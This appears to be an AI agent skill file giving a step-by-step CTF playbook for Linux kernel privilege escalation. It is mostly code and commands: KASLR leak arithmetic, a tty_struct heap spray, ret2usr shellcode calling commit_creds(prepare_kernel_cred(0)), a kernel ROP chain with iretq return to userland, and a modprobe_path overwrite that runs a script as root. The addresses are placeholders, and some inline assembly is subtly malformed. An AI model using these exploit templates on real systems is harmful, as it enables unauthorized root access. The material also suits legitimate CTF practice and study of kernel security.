---
name: pwn-kernel
description: "CTF Linux kernel exploitation. QEMU debugging setup, KASLR/FGKASLR bypass, kernel heap spray (tty_struct, poll_list), stack overflow, ret2usr, kernel ROP, prepare_kernel_cred/commit_creds, modprobe_path overwrite, iretq restoration. Triggers: 'kernel exploit', 'kernel pwn', 'lpe', 'linux privilege escalation', 'kaslr bypass', 'kernel rop', 'kernel heap', 'tty_struct', 'modprobe_path', 'ctf kernel'."
---

# CTF Pwn: Linux Kernel Exploitation

QEMU debug setup, kernel heap spray, KASLR bypass, ret2usr, kernel ROP.

## Install

```bash
apt-get install -y qemu-system-x86 gdb pwndbg
pip install pwntools --break-system-packages

# Extract vmlinux from vmlinuz (if needed):
extract-vmlinux /boot/vmlinuz-$(uname -r) > vmlinux
```

---

## Phase 1: Environment Setup

```bash
# Start QEMU with debugging:
qemu-system-x86_64 \
    -m 256M \
    -kernel bzImage \
    -hda rootfs.img \
    -append "console=ttyS0 root=/dev/sda quiet nokaslr" \
    -nographic \
    -s -S   # -s = gdbserver on :1234, -S = pause at start

# GDB attach:
gdb -q vmlinux
(gdb) target remote localhost:1234
(gdb) break start_kernel
(gdb) continue
(gdb) lx-version     # pwndbg kernel extensions

# Check KASLR:
cat /proc/kallsyms | head   # needs root
dmesg | grep "kaslr"

# Count ELF sections (detect FGKASLR):
readelf -S vmlinux | wc -l
# <30 sections = KASLR only
# >36000 sections = FGKASLR (per-function randomization)
```

---

## Phase 2: Information Leaks

```c
// Exploit a kernel driver vulnerability to leak kernel addresses:

// Uninit memory leak:
// Many kernel structs leave fields uninitialized
// Read via ioctl to get kernel pointers → calculate kaslr_base

// /proc/kallsyms leak (if accessible to low-priv user):
// grep for commit_creds or prepare_kernel_cred

// dmesg leak (if accessible):
// dmesg | grep "BUG: unable to handle"
// Stack trace contains kernel addresses

// In exploit code:
unsigned long kaslr_base = leaked_addr - known_symbol_offset;
unsigned long commit_creds_addr = kaslr_base + commit_creds_offset;
unsigned long prepare_kernel_cred_addr = kaslr_base + prepare_kernel_cred_offset;
```

---

## Phase 3: Kernel Heap Spray

```c
// Common sprayable structures:

// tty_struct (kmalloc-1024):
// Allocate via: open("/dev/ptmx", O_RDWR)
// Contains vtable pointer at offset 0x18
// Free via: close(fd)

// poll_list (variable size):
// Allocate via: poll() with many fds (POLLHUP * 512 = 1 page)
// Free when poll() returns

// msg_msg (kernel message queue):
// Allocate via: msgsnd()
// Can spray arbitrary size (up to 8192 bytes)
// Read back via: msgrcv()

// struct file (per-fd):
// Allocated per open() call

// Spray tty_struct to control vtable:
int ptmx_fds[100];
for (int i = 0; i < 100; i++) {
    ptmx_fds[i] = open("/dev/ptmx", O_RDWR);
}
// After overflow of adjacent object, tty_struct vtable corrupted
// → hijack RIP via ioctl()
```

---

## Phase 4: ret2usr (SMEP/SMAP disabled)

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

// Shellcode to escalate privileges:
void get_root() {
    // Kernel function addresses (from /proc/kallsyms or leak):
    void (*prepare_kernel_cred)(void*) = (void*)PREPARE_KERNEL_CRED_ADDR;
    void (*commit_creds)(void*) = (void*)COMMIT_CREDS_ADDR;
    
    commit_creds(prepare_kernel_cred(0));  // NULL = init_cred = root
}

// Return to userland after kernel code:
unsigned long user_rip = (unsigned long)post_exploit;
unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state() {
    __asm__ volatile(
        "mov %%cs, %0\n"
        "mov %%ss, %1\n"
        "mov %%rsp, %2\n"
        "pushfq; pop %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
    );
}

void restore_state() {
    // Push iretq frame: RIP, CS, RFLAGS, RSP, SS
    __asm__ volatile(
        "swapgs\n"
        "mov %0, %%r15\n"
        "mov %1, %%r14\n"
        "mov %2, %%r13\n"
        "mov %3, %%r12\n"
        "mov %4, %%r11\n"
        "push %%r11\n"  // SS
        "push %%r12\n"  // RSP
        "push %%r13\n"  // RFLAGS
        "push %%r14\n"  // CS
        "push %%r15\n"  // RIP
        "iretq\n"
        : "r"(user_rip), "r"(user_cs), "r"(user_rflags), "r"(user_sp), "r"(user_ss)
    );
}

void post_exploit() {
    if (getuid() == 0) {
        system("/bin/sh");
    }
}
```

---

## Phase 5: Kernel ROP Chain

```python
from pwn import *

# Kernel gadgets from vmlinux:
# ROPgadget --binary vmlinux | grep "pop rdi"
# ROPgadget --binary vmlinux | grep "ret$"

KASLR_BASE = 0  # fill from leak
COMMIT_CREDS = KASLR_BASE + 0x12345  # from kallsyms
PREPARE_KERNEL_CRED = KASLR_BASE + 0x23456

POP_RDI = KASLR_BASE + 0x100  # pop rdi ; ret
POP_RCX = KASLR_BASE + 0x200  # pop rcx ; ret
MOV_RDI_RAX = KASLR_BASE + 0x300  # mov rdi, rax ; ret

SWAPGS_POPFQ_RET = KASLR_BASE + 0x400  # swapgs ; popfq ; ret
IRETQ = KASLR_BASE + 0x500

# Kernel ROP chain:
rop = flat(
    POP_RDI,          # gadget: pop rdi ; ret
    0,                # NULL → init_cred
    PREPARE_KERNEL_CRED,  # prepare_kernel_cred(NULL)
    MOV_RDI_RAX,     # rdi = rax (cred ptr)
    COMMIT_CREDS,    # commit_creds(cred)
    
    # Restore userland:
    SWAPGS_POPFQ_RET,
    0,               # dummy for popfq
    IRETQ,
    # iretq frame: RIP CS RFLAGS RSP SS
    p64(post_exploit_addr),
    p64(user_cs),
    p64(user_rflags),
    p64(user_sp),
    p64(user_ss),
)
```

---

## Phase 6: modprobe_path Overwrite

```bash
# Technique: overwrite kernel's modprobe_path to execute arbitrary script

# 1. Write exploit script:
cat > /tmp/pwn.sh << 'EOF'
#!/bin/sh
cp /flag /tmp/flag
chmod 777 /tmp/flag
EOF
chmod +x /tmp/pwn.sh

# 2. In exploit: overwrite modprobe_path (kernel symbol at known address):
# modprobe_path = "/sbin/modprobe" → change to "/tmp/pwn.sh"
# Address: cat /proc/kallsyms | grep modprobe_path + KASLR_BASE
# Write via kernel exploit (arbitrary write primitive)

# 3. Trigger execution: kernel runs modprobe_path when unknown file format executed:
echo -ne "\xff\xff\xff\xff" > /tmp/trigger   # unknown magic bytes
chmod +x /tmp/trigger
/tmp/trigger   # → kernel calls modprobe, runs /tmp/pwn.sh as root

# 4. Read flag:
cat /tmp/flag
```

---

## Output

Save to `.omop/engagement/ctf/pwn/kernel/`:
- `exploit.c`: kernel exploit source
- `exploit`: compiled exploit binary
- `flag.txt`: captured root flag

## Next Phase

→ `post-container-escape` if inside container
→ `ctf-pwn-heap` for userspace heap after kernel LPE
